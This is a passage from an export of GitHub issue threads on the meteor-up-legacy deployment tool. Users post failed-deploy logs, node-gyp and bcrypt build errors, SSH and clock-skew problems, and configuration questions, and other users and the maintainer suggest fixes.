      <Body>@arunoda do you have any opinion on this? I have tried both mup and mupx with no luck. I assume its something to do with my nginx configuration. 
</Body>
    </Comment>
  </Issue_235>
  <Issue_236>
    <Repository>meteor-up-legacy</Repository>
    <Title>I've get this error is this mean something blocked by isp ?</Title>
    <Owner>arunoda</Owner>
    <Body>Connection reset by peer

```
-----------------------------------STDERR-----------------------------------
npm WARN cannot run in wd mosca@0.30.0 npm run bundle (wd=/opt/japndemo/tmp/bundle/programs/server/npm/npm-container/node_modules/mosca)
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
```

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
    curl: (56) Recv failure: Connection reset by peer
    Latest deployment failed! Reverted back to the previous version.
    -----------------------------------STDOUT-----------------------------------
</Body>
    <State>open</State>
    <Comment>
      <Owner>crapthings</Owner>
      <Body>after adding swap to ubuntu ecs

x Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
s/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js" "rebuild"
gyp ERR! cwd /opt/japndemo/tmp/bundle/programs/server/npm/npm-container/node_modules/mosca/node_modules/microtime
gyp ERR! node -v v0.10.36
gyp ERR! node-gyp -v v1.0.1
gyp ERR! not ok
npm ERR! microtime@1.4.2 install: `node-gyp rebuild`
npm ERR! Exit status 1
npm ERR!
npm ERR! Failed at the microtime@1.4.2 install script.
npm ERR! This is most likely a problem with the microtime package,
npm ERR! not with npm itself.
npm ERR! Tell the author that this fails on your system:
npm ERR!     node-gyp rebuild
npm ERR! You can get their info via:
npm ERR!     npm owner ls microtime
npm ERR! There is likely additional logging output above.

npm ERR! System Linux 3.13.0-32-generic
npm ERR! command "/usr/bin/node" "/usr/bin/npm" "install"
npm ERR! cwd /opt/japndemo/tmp/bundle/programs/server/npm/npm-container/node_modules/mosca
npm ERR! node -v v0.10.36
npm ERR! npm -v 1.4.28
npm ERR! code ELIFECYCLE
npm ERR! not ok code 0
-----------------------------------STDOUT-----------------------------------
 Release/obj.target/snappy/deps/snappy/snappy-1.1.1/snappy-stubs-internal.o
  CXX(target) Release/obj.target/snappy/deps/snappy/snappy-1.1.1/snappy.o
  AR(target) Release/obj.target/deps/snappy/snappy.a
  COPY Release/snappy.a
  CXX(target) Release/obj.target/leveldown/src/batch.o
  CXX(target) Release/obj.target/leveldown/src/batch_async.o
  CXX(target) Release/obj.target/leveldown/src/database.o
  CXX(target) Release/obj.target/leveldown/src/database_async.o
  CXX(target) Release/obj.target/leveldown/src/iterator.o
  CXX(target) Release/obj.target/leveldown/src/iterator_async.o
  CXX(target) Release/obj.target/leveldown/src/leveldown.o
  CXX(target) Release/obj.target/leveldown/src/leveldown_async.o
  SOLINK_MODULE(target) Release/obj.target/leveldown.node
  SOLINK_MODULE(target) Release/obj.target/leveldown.node: Finished
  COPY Release/leveldown.node
make: Leaving directory `/opt/japndemo/tmp/bundle/programs/server/npm/npm-container/node_modules/mosca/node_modules/leveldown/build'
----------------------------------------------------------------------------
```
</Body>
    </Comment>
  </Issue_236>
  <Issue_237>
    <Repository>meteor-up-legacy</Repository>
    <Title>Support for localhost use case without user/pass (jenkins slave by example)</Title>
    <Owner>arunoda</Owner>
    <Body>hi guys, anyone know how to use meteor up (mup) locally? My infrastructure uses jenkins slave and because of that I&#8217;m on the server and not remote when I do deploy, setup, etc. I tried without user/pass but that is mandatory.

Looks like meteor up does not supports local use case
</Body>
    <State>open</State>
    <Comment>
      <Owner>KristerV</Owner>
      <Body>I've got my mup.json on the server even though not using Jenkins. So same issue, no solution.
</Body>
    </Comment>
  </Issue_237>
  <Issue_238>
    <Repository>meteor-up-legacy</Repository>
    <Title>Passphrase protected key stopped working</Title>
    <Owner>arunoda</Owner>
    <Body>I saw you have added this in readme.md:  // WARNING: Keys protected by a passphrase are not supported

Why it's not supported anymore? I'm sure it was working few weeks ago..
</Body>
    <State>open</State>
    <Comment>
      <Owner>bimmlerd</Owner>
      <Body>:+1: 
It worked just fine, why isn't it supported anymore?
It still works with mup 0.9.7, so a temporary fix would be `npm -g install mup@0.9.7`
</Body>
    </Comment>
    <Comment>
      <Owner>timbrandin</Owner>
      <Body>Yeah, it worked before. I guess we're all mac users?
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>For that, now we use ssh-agent (early passphrase support was undocumented and it's a by product API)
Since we move into ssh2 we don't have it by default.

Now, you can get the same functionality by using an ssh-agent.
See: https://github.com/arunoda/meteor-up#ssh-keys-with-passphrase-or-ssh-agent-support
</Body>
    </Comment>
  </Issue_238>
  <Issue_239>
    <Repository>meteor-up-legacy</Repository>
    <Title>Question: When upstart starts the meteor app, is a PID file created?</Title>
    <Owner>arunoda</Owner>
    <Body>Looking to use monit with mup, and was wondering if a PID file was created anywhere? Looking at the script, I would guess no, but I wanted to check. If not, would it be possible to create one?
</Body>
    <State>open</State>
    <Comment>
      <Owner>cstrat</Owner>
      <Body>I am also keen to find out about this one...

Looking at this page, it looks like the .pid file could be created in the upstart config.
http://howtonode.org/deploying-node-upstart-monit

I don't know enough about the whole upstart process and node to understand if this is possible though.

edit: 
I have used the snippet from the answer here to do up/down monitoring.
http://stackoverflow.com/questions/24569308/monit-does-not-start-node-script
</Body>
    </Comment>
  </Issue_239>
  <Issue_240>
    <Repository>meteor-up-legacy</Repository>
    <Title>bcrypt issue</Title>
    <Owner>arunoda</Owner>
    <Body>mup logs

```
Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
[xx] Warning: Permanently added 'xxxxx' (RSA) to the list of known hosts.
[xx]     at Module.require (module.js:364:17)
    at require (module.js:380:17)
    at bindings (/opt/xxx/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/node_modules/bindings/bindings.js:74:15)
    at Object.&lt;anonymous&gt; (/opt/xxx/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/bcrypt.js:3:35)
    at Module._compile (module.js:456:26)
    at Object.Module._extensions..js (module.js:474:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
error: Forever detected script exited with code: 8
error: Script restart attempt #9230
```

deploy error

```
[xx] &#10008; Invoking deployment process: FAILED

    -----------------------------------STDERR-----------------------------------
    Warning: Permanently added 'xxxx' (RSA) to the list of known hosts.
    -----------------------------------STDOUT-----------------------------------
     &gt; ./bcrypt: npm install due to binary npm modules
    ----------------------------------------------------------------------------
```

I tried to install bcrypt manually to server but no luck. any workaround ?
</Body>
    <State>open</State>
    <Comment>
      <Owner>kenken17</Owner>
      <Body>I have the same issue. Anyone got a fix for this?
</Body>
    </Comment>
    <Comment>
      <Owner>joaopiopedreira</Owner>
      <Body>This has most probably nothing to do with bcrypt.

See this: https://github.com/arunoda/meteor-up/issues/377

Enviado do meu iPhone

No dia 20/04/2015, &#224;s 05:32, Ken notifications@github.com escreveu:

&gt; I have the same issue. Anyone got a fix for this?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub.
</Body>
    </Comment>
    <Comment>
      <Owner>kenken17</Owner>
      <Body>Indeed. I was using 0.10.36 and 0.12.2. But both no luck. Then I run again on 0.10.36, it works! Logs are helpful, `mup logs -n 100`, show 100 lines then maybe can get some clue. 
</Body>
    </Comment>
    <Comment>
      <Owner>berkaey</Owner>
      <Body>some how still getting these on new apps old apps are deploying fine but (without a mup setup) server has 0.10.36. last time some how I manage to deploy. any ideas to get rid of this for good. a new server maybe?
</Body>
    </Comment>
  </Issue_240>
  <Issue_241>
    <Repository>meteor-up-legacy</Repository>
    <Title>Forever Stuck at: Invoking deployment process</Title>
    <Owner>arunoda</Owner>
    <Body>Whenever I mup deploy or mup setup -&gt; mup deploy, I'm forever stuck at "Invoking deployment process".

I'm using node 0.10.36.

I've also been noticing lately that the first visit to the website has become ridiculously slow. Like 30 seconds slow. For some reason I think mup deploy may have something to do with it.
</Body>
    <State>open</State>
    <Comment>
      <Owner>ashah888</Owner>
      <Body>mup setup doesn't seem to work either. Stuck at "Installing Node.Js"
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>You need to check you servers ssh configurations. That's the place where it
got stuck at.
On 2015 &#3461;&#3508;&#3530;&#8205;&#3515;&#3546;&#3517;&#3530; 16, &#3510;&#3530;&#8205;&#3515;&#3524;&#3523;&#3530; at &#3508;&#3545;.&#3520;. 6.44 ashah888 &lt;
notifications@github.com&gt; wrote:

&gt; mup setup doesn't seem to work either. Stuck at "Installing Node.Js"
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/379#issuecomment-93610405.
</Body>
    </Comment>
    <Comment>
      <Owner>ashah888</Owner>
      <Body>I'm sorry, but can you elaborate how I would check that please?
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Try to login to your server with ssh.
On 2015 &#3461;&#3508;&#3530;&#8205;&#3515;&#3546;&#3517;&#3530; 16, &#3510;&#3530;&#8205;&#3515;&#3524;&#3523;&#3530; at &#3508;&#3545;.&#3520;. 6.54 ashah888 &lt;
notifications@github.com&gt; wrote:

&gt; I'm sorry, but can you elaborate how I would check that please?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/379#issuecomment-93611620.
</Body>
    </Comment>
    <Comment>
      <Owner>ashah888</Owner>
      <Body>That works perfectly fine. And I'm using the same credentials in my mup.json..
</Body>
    </Comment>
    <Comment>
      <Owner>neppi</Owner>
      <Body>i run into the same issue. i have node v0.10.36. on ubuntu 14.04 server. Some Days ago it worked like charm. It could be possible that someone updated ubuntu with some security updates.

If i deploy in debug with Command: 

```
DEBUG=* mup deploy 
```

the code stops after line 

```
nodemiral:sess:141.30.39.38 spawning command- ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/xNmcWCrbj3T91Ue55 user@141.30.39.38 "bash -s" &lt; /tmp/RBEqRi6B4IAVpj7ns +2ms
```

What should be the next Step?
</Body>
    </Comment>
    <Comment>
      <Owner>neppi</Owner>
      <Body>After 10 Minutes of Waiting the process suddenly restarted working. Maybe just wait.

I figured out that the isue is related to the clock on the server. If the clock on the server is not in sync you have to wait very long.
</Body>
    </Comment>
    <Comment>
      <Owner>tehfailsafe</Owner>
      <Body>Is there a fix to this? I too am waiting 10-15 minutes each deployment.
</Body>
    </Comment>
    <Comment>
      <Owner>neppi</Owner>
      <Body>Maybe you can run this commands on your Server to force setting correct time.

``` bash
# not needed if no ntp service is running
sudo service ntp stop
# updates the time
sudo ntpdate -s time.nist.gov
# restart ntp service if stopped
sudo service ntp start 
```

i advise you to check your local time too.

Neppi
</Body>
    </Comment>
    <Comment>
      <Owner>jm4r7in</Owner>
      <Body>Why is local time so important ?
</Body>
    </Comment>
    <Comment>
      <Owner>tehfailsafe</Owner>
      <Body>My local time was 10 minutes ahead of real time (trying to make it more on time to meetings!)  Once set to correct time deployment speeds right through.
</Body>
    </Comment>
    <Comment>
      <Owner>aykutyaman</Owner>
      <Body>local time was the problem for me, too.  I have updated my local time to the real time, and everything works now as before.
</Body>
    </Comment>
    <Comment>
      <Owner>Innarticles</Owner>
      <Body>+1 The local time was also a problem for me. I was an hour ahead. The problem was fixed as soon as I corrected my local time.
</Body>
    </Comment>
  </Issue_241>
  <Issue_242>
    <Repository>meteor-up-legacy</Repository>
    <Title>Prevent refresh on connected clients</Title>
    <Owner>arunoda</Owner>
    <Body>Is it possible to prevent clients apps from being refreshed with I do `mup deploy`?

E.g. I've got a screen where people will be having a video conference, similar to Google Hangout but in my own app. If their client refreshes they will loose communication. What would be the way around this?

Thanks,
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>You need to disable the hot code push. There are packages that do that:
https://atmospherejs.com/solderzzc/disable-hot-code-push
or you can do that manually
http://stackoverflow.com/questions/27682888/how-can-i-disable-live-reload-in-meteor
</Body>
    </Comment>
  </Issue_242>
  <Issue_243>
    <Repository>meteor-up-legacy</Repository>
    <Title>When do I get the following error?</Title>
    <Owner>arunoda</Owner>
    <Body>Sometimes I get the following error when I do `mup deploy`

`ssh_exchange_identification: read: Connection reset by peer`

Does it happen if I deploy too frequently?
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>No actually. There is no such built in limitations.
This may be a network issue.

On Sat, Apr 11, 2015 at 10:18 PM Howon Song notifications@github.com
wrote:

&gt; Sometimes I get the following error when I do mup deploy
&gt; 
&gt; ssh_exchange_identification: read: Connection reset by peer
&gt; 
&gt; Does it happen if I deploy too frequently?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/368.
</Body>
    </Comment>
  </Issue_243>
  <Issue_244>
    <Repository>meteor-up-legacy</Repository>
    <Title>Suggestion: auto-updating Node</Title>
    <Owner>arunoda</Owner>
    <Body>I've noticed that one of the most common problems when trying to redeploy an older app with Mup is having an out-of-date Node version. 

So here's an idea: if Mup detects a deploy is failing because of an out-of-date version, it could display a message saying something like "Mup has detected an out-of-date Node, do you want to update it to 0.10.36?".

If you choose "yes" then it would just change your Node version, and then do `mup setup` for you automatically before trying to redeploy again. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>valgalin</Owner>
      <Body>+1 for this :) I had headaches, for days, about this issue when I get errors in deploying the Telescope app because of out-of-date Node. Thanks, guys!
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Got it.
This is my first priority task for the next version of mup.
see #363
</Body>
    </Comment>
    <Comment>
      <Owner>SachaG</Owner>
      <Body>Oh nice! Thanks as always :)
</Body>
    </Comment>
  </Issue_244>
  <Issue_245>
    <Repository>meteor-up-legacy</Repository>
    <Title>Accessing MongoDB from pymongo client</Title>
    <Owner>arunoda</Owner>
    <Body>From pymongo, I can access the mongodb setup by Meteor-up by doing

`client = MongoClient('mongodb://127.0.0.1:3001/myAppName')`

However, it gives me the error message:

`pymongo.errors.ConnectionFailure: [Errno 111] Connection refused`

I tried setting the `bindip` to `0.0.0.0` or commenting it out entirely but had no luck with it.
Do you have any idea?
</Body>
    <State>open</State>
    <Comment>
      <Owner>woniesong92</Owner>
      <Body>I could connect to the db by doing

`client = MongoClient('mongodb://localhost/APPNAME')`
`posts = client.APPNAME.posts`
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>You don't need to mention about pyMongo.

But, check whether we have some information about the mongodb setup.
If it's not, try to add about hosts and ports about it.

On Mon, Apr 6, 2015 at 10:38 AM Howon Song notifications@github.com wrote:

&gt; Oh, I should've left out the port actually.
&gt; 
&gt; client = MongoClient('mongodb://127.0.0.1/myAppName')
&gt; 
&gt; Do you think such information might be useful in README? I can submit a PR.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/357#issuecomment-89920918.
</Body>
    </Comment>
  </Issue_245>
  <Issue_246>
    <Repository>meteor-up-legacy</Repository>
    <Title>meteoruser to control app deployed with MUP</Title>
    <Owner>arunoda</Owner>
    <Body>Hi,

it's not a proper issue, maybe I'm doing something wrong. I'm trying to remotely control my app deployed with MUP and using child_process 'exec' command which by default uses 'meteoruser' (didn't succeeded to change that).

I added meteoruser to sudo group in order to get initctl access but even with that and adding in Upstart.conf the sudo group I can't get anything else than status option. To modify I'm stuck ("start: You do not have permission to modify job" [jobname]...) and it looks like this thread :  
http://askubuntu.com/questions/229809/allow-non-sudo-group-to-control-upstart-job

So maybe it is because the conf deployed by mup is in /etc/init but do you think there would be a workaround for that?

Thanks for your help!
</Body>
    <State>open</State>
    <Comment>
      <Owner>iboxgithub</Owner>
      <Body>I found a workaround using a subshell but I still wonder if this is not caused by the use of [userdown] API
</Body>
    </Comment>
  </Issue_246>
  <Issue_247>
    <Repository>meteor-up-legacy</Repository>
    <Title>Relative app path and autofill appName in init config</Title>
    <Owner>arunoda</Owner>
    <Body>fixes #320 specifically
</Body>
    <State>open</State>
    <Comment>
      <Owner>hems</Owner>
      <Body>+1 for this, highly needed specially if sharing `mup.json` among different computers 
</Body>
    </Comment>
  </Issue_247>
  <Issue_248>
    <Repository>meteor-up-legacy</Repository>
    <Title>app name and path defaults to current directory if not defined</Title>
    <Owner>arunoda</Owner>
    <Body>fixes #183 #233 #56, potentially #320
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>I think this will confuse if we are using this in different environment. 
For example when different using deploying the app. 

So, what we do can do it this. 
When we do mup init, let's do this an fill the config file. 
Default, appUrl can be ./ or we can detect the root of the app. 
</Body>
    </Comment>
    <Comment>
      <Owner>protometa</Owner>
      <Body>Yeah, it's up to you. It could work with #337 to handle the case of different deployments.

This doesn't affect the init yet. It could have the same effect as a default `./`. But really this just makes the fields optional. It's backwards compatible and the fields can remain in the intial `mup.json`.
</Body>
    </Comment>
  </Issue_248>
  <Issue_249>
    <Repository>meteor-up-legacy</Repository>
    <Title>mup deploy failing to beagle bone black sudo: stop: command not found.</Title>
    <Owner>arunoda</Owner>
    <Body>Hi 
I am trying to use mup to deploy to a beaglebone black board. I have managed to get mongodb running ok and accepting the new connection.  I have now got stuck at this point:

Started TaskList: Deploy app 'light' (linux)
[192.168.0.17] - Uploading bundle
[192.168.0.17] &#10004; Uploading bundle: SUCCESS
[192.168.0.17] - Setting up Environment Variables
[192.168.0.17] &#10004; Setting up Environment Variables: SUCCESS
[192.168.0.17] - Invoking deployment process
[192.168.0.17] &#10008; Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
or-output',
gyp info spawn args   'build',
gyp info spawn args   '-Goutput_dir=.' ]
gyp info spawn make
gyp info spawn args [ 'BUILDTYPE=Release', '-C', 'build' ]
gyp info ok 
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data
../src/coroutine.cc: In function 'void* find_thread_id_key(void*)':
../src/coroutine.cc:90:3: warning: 'thread_id' may be used uninitialized in this function [-Wuninitialized]
sudo: stop: command not found
sudo: start: command not found
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
```

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) couldn't connect to host
    sudo: stop: command not found
    sudo: start: command not found
    Latest deployment failed! Reverted back to the previous version.
    -----------------------------------STDOUT-----------------------------------
    /coroutine.o
      CC(target) Release/obj.target/fibers/src/libcoro/coro.o
      SOLINK_MODULE(target) Release/obj.target/fibers.node
      SOLINK_MODULE(target) Release/obj.target/fibers.node: Finished
      COPY Release/fibers.node
    make: Leaving directory `/opt/light/tmp/bundle/programs/server/node_modules/fibers/build'
    Installed in`/opt/light/tmp/bundle/programs/server/node_modules/fibers/bin/linux-arm-v8-3.14/fibers.node`
    underscore@1.5.2 node_modules/underscore

```
eachline@2.3.3 node_modules/eachline
&#9492;&#9472;&#9472; type-of@2.0.1

semver@4.1.0 node_modules/semver

chalk@0.5.1 node_modules/chalk
&#9500;&#9472;&#9472; escape-string-regexp@1.0.3
&#9500;&#9472;&#9472; ansi-styles@1.1.0
&#9500;&#9472;&#9472; supports-color@0.2.0
&#9500;&#9472;&#9472; strip-ansi@0.3.0 (ansi-regex@0.2.1)
&#9492;&#9472;&#9472; has-ansi@0.1.0 (ansi-regex@0.2.1)

source-map-support@0.2.8 node_modules/source-map-support
&#9492;&#9472;&#9472; source-map@0.1.32 (amdefine@0.1.0)

fibers@1.0.5 node_modules/fibers
Waiting for MongoDB to initialize. (5 minutes)
connected
Waiting for 30 seconds while app is booting up
Checking is app booted or not?
----------------------------------------------------------------------------
```

When i try and view the logs I get the following:
## Meteor Up: Production Quality Meteor Deployments

[192.168.0.17] Warning: Permanently added '192.168.0.17' (RSA) to the list of known hosts.
[192.168.0.17] Debian GNU/Linux 7

BeagleBoard.org BeagleBone Debian Image 2014-04-23

Support/FAQ: http://elinux.org/Beagleboard:BeagleBoneBlack_Debian
[192.168.0.17] tail: [192.168.0.17] cannot open `/var/log/upstart/light.log' for reading[192.168.0.17] : No such file or directory

Any help getting me further with this would be much appreciated!

Regards

Dom
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Check logs `mup logs -n 300`
</Body>
    </Comment>
  </Issue_249>
  <Issue_250>
    <Repository>meteor-up-legacy</Repository>
    <Title>Cannot even install on MAC/OSX </Title>
    <Owner>arunoda</Owner>
    <Body>![image](https://cloud.githubusercontent.com/assets/485535/6750335/e34f5a2a-cf01-11e4-9267-87f2b59cb811.png)

It basically does nothing

Here is my mup.json file

```

{
  // Server authentication info
  "servers": [
    {
      "host": "localhost",
      "username": "root",
      "password": "password"
      // or pem file (ssh based authentication)
      //"pem": "~/.ssh/id_rsa"
    }
  ],

  // Install MongoDB in the server, does not destroy local MongoDB on future setup
  "setupMongo": true,

  // WARNING: Node.js is required! Only skip if you already have Node.js installed on server.
  "setupNode": false,

  // WARNING: If nodeVersion omitted will setup 0.10.36 by default. Do not use v, only version number.
  "nodeVersion": "0.12.0",

  // Install PhantomJS in the server
  "setupPhantom": false,

  // Application name (No spaces)
  "appName": "meteor",

  // Location of app (local directory)
  "app": "/path/to/the/app",

  // Configure environment
  "env": {
    "ROOT_URL": "http://myapp.com"
  },

  // Meteor Up checks if the app comes online just after the deployment
  // before mup checks that, it will wait for no. of seconds configured below
  "deployCheckWaitTime": 15
}


```
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Please watch this screencast: https://www.youtube.com/watch?v=WLGdXtZMmiI
You may need some more information on this.
</Body>
    </Comment>
    <Comment>
      <Owner>dubvfan87</Owner>
      <Body>Also should note that Meteor does not support nodeVersion 0.12 use the suggested default 0.10.36
</Body>
    </Comment>
    <Comment>
      <Owner>adaptabi</Owner>
      <Body>How it doesn't support?
I have node 0.12 installed globally and meteor is running smoothly
</Body>
    </Comment>
  </Issue_250>
  <Issue_251>
    <Repository>meteor-up-legacy</Repository>
    <Title>Error when invoking deployment process</Title>
    <Owner>arunoda</Owner>
    <Body>```
-----------------------------------STDERR-----------------------------------
 (module.js:338:15)
    at Function.Module._load (module.js:280:25)
    at Module.require (module.js:364:17)
    at require (module.js:380:17)
    at Object.&lt;anonymous&gt; (/usr/share/node-gyp/lib/node-gyp.js:12:10)
    at Module._compile (module.js:456:26)
    at Object.Module._extensions..js (module.js:474:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
    at Module.require (module.js:364:17)
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
```

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 3000: Connection refused
    Latest deployment failed! Reverted back to the previous version.
    -----------------------------------STDOUT-----------------------------------
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Please invoke mup logs -n 400.
On 2015 &#3512;&#3535;&#3515;&#3530;&#3501;&#3540; 19, &#3510;&#3530;&#8205;&#3515;&#3524;&#3523;&#3530; at &#3508;.&#3520;. 7.48 nicklewers notifications@github.com
wrote:

&gt; -----------------------------------STDERR-----------------------------------
&gt;  (module.js:338:15)
&gt;     at Function.Module._load (module.js:280:25)
&gt;     at Module.require (module.js:364:17)
&gt;     at require (module.js:380:17)
&gt;     at Object.&lt;anonymous&gt; (/usr/share/node-gyp/lib/node-gyp.js:12:10)
&gt;     at Module._compile (module.js:456:26)
&gt;     at Object.Module._extensions..js (module.js:474:10)
&gt;     at Module.load (module.js:356:32)
&gt;     at Function.Module._load (module.js:312:12)
&gt;     at Module.require (module.js:364:17)
&gt; npm WARN package.json meteor-dev-bundle@0.0.0 No description
&gt; npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
&gt; npm WARN package.json meteor-dev-bundle@0.0.0 No README data
&gt;   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
&gt;                                  Dload  Upload   Total   Spent    Left  Speed
&gt; 
&gt; 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0curl: (7) Failed to connect to
&gt; localhost port 3000: Connection refused
&gt; Latest deployment failed! Reverted back to the previous version.
&gt; 
&gt; -----------------------------------STDOUT-----------------------------------
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/323.
</Body>
    </Comment>
    <Comment>
      <Owner>nicklewers</Owner>
      <Body>Error: /opt/Genres/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build/Release/bcrypt_lib.node: invalid ELF header
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
    at Module.require (module.js:364:17)
    at require (module.js:380:17)
    at bindings (/opt/Genres/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/node_modules/bindings/bindings.js:74:15)
    at Object.&lt;anonymous&gt; (/opt/Genres/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/bcrypt.js:1:97)
    at Module._compile (module.js:456:26)
    at Object.Module._extensions..js (module.js:474:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
error: Forever detected script exited with code: 8
</Body>
    </Comment>
    <Comment>
      <Owner>davidcittadini</Owner>
      <Body>I have also had a connection problem as follows:

-----------------------------------STDERR-----------------------------------
    gyp/0.10.36',
    gyp info spawn args   '-Dmodule_root_dir=/opt/meteor/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt',
    gyp info spawn args   '--depth=.',
    gyp info spawn args   '--no-parallel',
    gyp info spawn args   '--generator-output',
    gyp info spawn args   'build',
    gyp info spawn args   '-Goutput_dir=.' ]
    gyp info spawn make
    gyp info spawn args [ 'BUILDTYPE=Release', '-C', 'build' ]
    gyp info ok
    npm WARN package.json meteor-dev-bundle@0.0.0 No description
    npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
    npm WARN package.json meteor-dev-bundle@0.0.0 No README data
    stop: Unknown instance:
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 3000: Connection refused
    Latest deployment failed! Reverted back to the previous version.
    -----------------------------------STDOUT-----------------------------------
    rypt_lib.node: Finished
      COPY Release/bcrypt_lib.node
    make: Leaving directory `/opt/meteor/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build'

```
&gt; fibers@1.0.5 install /opt/meteor/tmp/bundle/programs/server/node_modules/fibers
&gt; node ./build.js

`linux-x64-v8-3.14` exists; testing
Binary is fine; exiting
underscore@1.5.2 node_modules/underscore

semver@4.1.0 node_modules/semver

eachline@2.3.3 node_modules/eachline
&#9492;&#9472;&#9472; type-of@2.0.1

fibers@1.0.5 node_modules/fibers

source-map-support@0.2.8 node_modules/source-map-support
&#9492;&#9472;&#9472; source-map@0.1.32 (amdefine@0.1.0)

chalk@0.5.1 node_modules/chalk
&#9500;&#9472;&#9472; ansi-styles@1.1.0
&#9500;&#9472;&#9472; escape-string-regexp@1.0.3
&#9500;&#9472;&#9472; supports-color@0.2.0
&#9500;&#9472;&#9472; strip-ansi@0.3.0 (ansi-regex@0.2.1)
&#9492;&#9472;&#9472; has-ansi@0.1.0 (ansi-regex@0.2.1)
Waiting for MongoDB to initialize. (5 minutes)
connected
meteor start/running, process 17386
Waiting for 15 seconds while app is booting up
Checking is app booted or not?
meteor stop/waiting
meteor start/running, process 17413
----------------------------------------------------------------------------
```

The logs say:

[192.168.33.10] Warning: Permanently added '192.168.33.10' (ECDSA) to the list of known hosts.
[192.168.33.10]     at net.js:834:16
    at process._tickCallback (node.js:442:13)
error: Forever detected script exited with code: 8
error: Script restart attempt #1

&gt; &gt; stepping down to gid: meteoruser
&gt; &gt; stepping down to uid: meteoruser
&gt; &gt; stepping down to gid: meteoruser
&gt; &gt; stepping down to uid: meteoruser
&gt; &gt; stepping down to gid: meteoruser
&gt; &gt; stepping down to uid: meteoruser
</Body>
    </Comment>
    <Comment>
      <Owner>delvedor</Owner>
      <Body>Hi!
I have the same issue.

```
&#10008; Invoking deployment process: FAILED

    -----------------------------------STDERR-----------------------------------
    odules/npm/node_modules/node-gyp/bin/node-gyp.js" "rebuild" "--release"
    gyp ERR! cwd /opt/app/tmp/bundle/programs/server/node_modules/fibers
    gyp ERR! node -v v0.12.0
    gyp ERR! node-gyp -v v1.0.2
    gyp ERR! not ok 
    Build failed
    npm ERR! Linux 3.13.0-43-generic
    npm ERR! argv "/usr/local/bin/node" "/usr/local/bin/npm" "install"
    npm ERR! node v0.12.0
    npm ERR! npm  v2.5.1
    npm ERR! code ELIFECYCLE

    npm ERR! fibers@1.0.5 install: `node ./build.js`
    npm ERR! Exit status 1
    npm ERR! 
    npm ERR! Failed at the fibers@1.0.5 install script 'node ./build.js'.
    npm ERR! This is most likely a problem with the fibers package,
    npm ERR! not with npm itself.
    npm ERR! Tell the author that this fails on your system:
    npm ERR!     node ./build.js
    npm ERR! You can get their info via:
    npm ERR!     npm owner ls fibers
    npm ERR! There is likely additional logging output above.

    npm ERR! Please include the following file with any support request:
    npm ERR!     /opt/app/tmp/bundle/programs/server/npm-debug.log
